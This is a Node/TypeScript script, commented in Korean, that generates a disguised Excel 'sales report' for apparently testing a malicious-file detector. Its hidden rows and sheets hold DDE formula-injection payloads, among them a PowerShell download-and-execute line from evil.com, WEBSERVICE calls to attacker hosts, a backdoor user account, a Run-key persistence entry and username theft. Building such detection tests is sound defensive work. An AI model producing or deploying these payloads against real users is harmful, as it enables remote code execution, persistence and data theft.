import * as XLSX from 'xlsx'
import * as fs from 'fs'

// 강화된 악성코드 의심 테스트 파일 생성
const workbook = XLSX.utils.book_new()

// 메인 시트 데이터
const mainData = [
  ['회사명', '분기', '매출', '이익'],
  ['ABC Corp', '2024 Q1', 1000000, 250000],
  ['ABC Corp', '2024 Q2', 1200000, 300000],
  ['ABC Corp', '2024 Q3', 1100000, 280000],
  ['', '', '', ''],
  ['합계', '', '=SUM(C2:C4)', '=SUM(D2:D4)'],
  ['', '', '', ''],
  ['아래 링크를 클릭하여 상세 보고서를 확인하세요:', '', '', ''],
]

// 메인 시트 생성
const mainSheet = XLSX.utils.aoa_to_sheet(mainData)

// 다양한 DDE 공격 패턴 추가 - 강화된 버전
const maliciousFormulas = [
  // 1. 전통적인 DDE 패턴
  { cell: 'A10', formula: 'cmd|"/c calc.exe"!A1' },
  { cell: 'B10', formula: 'cmd|"/c powershell.exe"!A1' },
  { cell: 'C10', formula: 'cmd|"/c notepad.exe"!A1' },
  
  // 2. DDEAUTO 패턴
  { cell: 'A11', formula: 'DDEAUTO("c:\\\\windows\\\\system32\\\\cmd.exe", "/c calc")' },
  { cell: 'B11', formula: 'DDEAUTO("cmd", "/c echo malicious")' },
  
  // 3. 외부 링크와 결합된 DDE
  { cell: 'A12', formula: '[악성파일.xlsx]Sheet1!cmd|"/c calc"!A1' },
  { cell: 'B12', formula: '[외부파일.xls]Data!cmd|"/c powershell"!A1' },
  
  // 4. 숨겨진 HYPERLINK 공격
  { cell: 'A13', formula: 'HYPERLINK("file:///c:/windows/system32/cmd.exe /c calc", "보고서 다운로드")' },
  { cell: 'B13', formula: 'HYPERLINK("\\\\\\\\malicious-server\\\\share\\\\evil.exe", "중요 문서")' },
  
  // 5. WEBSERVICE를 통한 외부 연결
  { cell: 'A14', formula: 'WEBSERVICE("http://evil-site.com/steal-data")' },
  { cell: 'B14', formula: 'WEBSERVICE("https://attacker.com/data.json")' },
  
  // 6. 명령어 주입 패턴 (새로 추가)
  { cell: 'A15', formula: 'msexcel|"/c calc.exe"!A1' },
  { cell: 'B15', formula: 'winword|"/c powershell.exe"!A1' },
  { cell: 'C15', formula: 'excel|"/c cmd /k"!A1' },
  
  // 7. 고급 명령어 실행 패턴
  { cell: 'A16', formula: 'cmd|"/k net user hacker password123 /add"!A1' },
  { cell: 'B16', formula: 'cmd|"/c taskkill /f /im explorer.exe"!A1' },
  { cell: 'C16', formula: 'powershell|"-c Invoke-WebRequest"!A1' },
  
  // 8. 시스템 경로 노출
  { cell: 'A17', formula: 'cmd|"/c dir c:\\\\windows\\\\system32"!A1' },
  { cell: 'B17', formula: 'cmd|"/c type c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"!A1' },
]

// 악성 수식들을 셀에 적용
maliciousFormulas.forEach(({ cell, formula }) => {
  // = 없이 DDE 패턴 설정 (브라우저 환경에서 생성된 파일 특성)
  mainSheet[cell] = {
    t: 'str',
    v: formula,
    f: formula // 수식으로도 설정
  }
})

// 추가로 숨겨진 행/열 설정
mainSheet['!rows'] = []
for (let i = 9; i < 18; i++) {
  mainSheet['!rows'][i] = { hidden: true } // 악성 수식이 있는 행들 숨기기
}

mainSheet['!cols'] = []
mainSheet['!cols'][7] = { hidden: true } // H열 숨기기
mainSheet['!cols'][8] = { hidden: true } // I열 숨기기

// 악성 수식을 숨겨진 열에도 추가
mainSheet['H1'] = {
  t: 'str',
  v: 'cmd|"/c echo hidden_malware"!A1'
}

mainSheet['I1'] = {
  t: 'str', 
  v: 'DDEAUTO("powershell", "-c Get-Process")'
}

XLSX.utils.book_append_sheet(workbook, mainSheet, '매출보고서')

// 숨겨진 시트 생성 - 더 많은 악성 패턴
const hiddenSheet = XLSX.utils.aoa_to_sheet([
  ['시스템 정보', '비밀 데이터'],
  ['', ''],
  ['사용자:', process.env.USER || 'unknown'],
  ['OS:', process.platform],
  ['', ''],
  ['중요: 이 파일을 실행하면 시스템이 감염됩니다']
])

// 숨겨진 시트에 더 위험한 DDE 패턴들 추가
const hiddenMaliciousFormulas = [
  { cell: 'A2', formula: 'DDE("cmd","/c calc.exe","")' },
  { cell: 'B2', formula: 'cmd|" /C powershell -nop -w hidden -c \\"IEX ((new-object net.webclient).downloadstring(\\'http://evil.com/payload\\'))\\"' },
  { cell: 'A7', formula: 'DDEAUTO("c:\\\\windows\\\\system32\\\\cmd.exe", "/c start evil.exe")' },
  { cell: 'B7', formula: 'cmd|"/c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Evil /t REG_SZ /d evil.exe"!A1' },
  { cell: 'A8', formula: 'msexcel|"../../../windows/system32/cmd.exe /c calc"!A1' },
  { cell: 'B8', formula: 'excel|"..\\\\..\\\\..\\\\windows\\\\system32\\\\calc.exe"!A1' },
  { cell: 'A9', formula: 'cmd|"/c echo %USERNAME% > c:\\\\temp\\\\stolen.txt"!A1' },
  { cell: 'B9', formula: 'powershell|"-c [System.Environment]::UserName | Out-File c:\\\\temp\\\\user.txt"!A1' }
]

hiddenMaliciousFormulas.forEach(({ cell, formula }) => {
  hiddenSheet[cell] = {
    t: 'str',
    v: formula,
    f: formula
  }
})

XLSX.utils.book_append_sheet(workbook, hiddenSheet, 'System_Config')

// 세 번째 시트 - 매크로 시뮬레이션 (VBA는 실제로 포함되지 않지만 패턴 시뮬레이션)
const macroSheet = XLSX.utils.aoa_to_sheet([
  ['Auto_Open', 'Auto_Close'],
  ['Workbook_Open', 'Workbook_Activate'], 
  ['', ''],
  ['이 시트는 매크로 기능을 시뮬레이션합니다', '']
])

// 매크로 관련 이름들을 수식으로 추가
macroSheet['A1'] = {
  t: 'str',
  v: 'Auto_Open',
  f: 'cmd|"/c echo Auto_Open executed"!A1'
}

macroSheet['B1'] = {
  t: 'str', 
  v: 'Auto_Close',
  f: 'cmd|"/c echo Auto_Close executed"!A1'
}

XLSX.utils.book_append_sheet(workbook, macroSheet, 'Macros')

// 워크북 속성 설정
if (!workbook.Workbook) workbook.Workbook = {}
if (!workbook.Workbook.Sheets) workbook.Workbook.Sheets = []

// 두 번째와 세 번째 시트를 숨김 처리
workbook.Workbook.Sheets[1] = { Hidden: 1 } // System_Config 시트 숨기기
workbook.Workbook.Sheets[2] = { Hidden: 1 } // Macros 시트 숨기기

// 의심스러운 정의된 이름들 추가
if (!workbook.Workbook.Names) workbook.Workbook.Names = []
workbook.Workbook.Names.push(
  {
    Name: 'Auto_Open',
    Ref: 'Macros!$A$1'
  },
  {
    Name: 'Auto_Close', 
    Ref: 'Macros!$B$1'
  },
  {
    Name: 'AutoExec',
    Ref: 'System_Config!$A$1'
  },
  {
    Name: 'Workbook_Open',
    Ref: 'System_Config!$A$7'
  },
  {
    Name: 'Evil_Payload',
    Ref: 'System_Config!$B$9'
  }
)

// 파일 저장
const outputPath = './public/enhanced-malicious-test.xlsx'
XLSX.writeFile(workbook, outputPath)

console.log('🚨 강화된 악성코드 의심 테스트 파일 생성 완료!')
console.log('📁 파일 위치:', outputPath)
console.log('')
console.log('📋 포함된 공격 패턴:')
console.log('   • DDE 명령어 실행 패턴 (다양한 형태)')
console.log('   • DDEAUTO 자동 실행 패턴')
console.log('   • 명령어 주입 패턴 (cmd, powershell)')
console.log('   • 외부 링크 및 파일 연결')
console.log('   • 악성 HYPERLINK 패턴')
console.log('   • WEBSERVICE 외부 연결')
console.log('   • 시스템 경로 접근 시도')
console.log('   • 레지스트리 조작 명령어')
console.log('   • 숨겨진 시트 (2개)')
console.log('   • 숨겨진 행/열')
console.log('   • 의심스러운 자동 실행 이름들')
console.log('')
console.log('⚠️  이 파일은 테스트 목적으로만 사용하세요!')
console.log('   실제 환경에서는 절대 열지 마세요!')
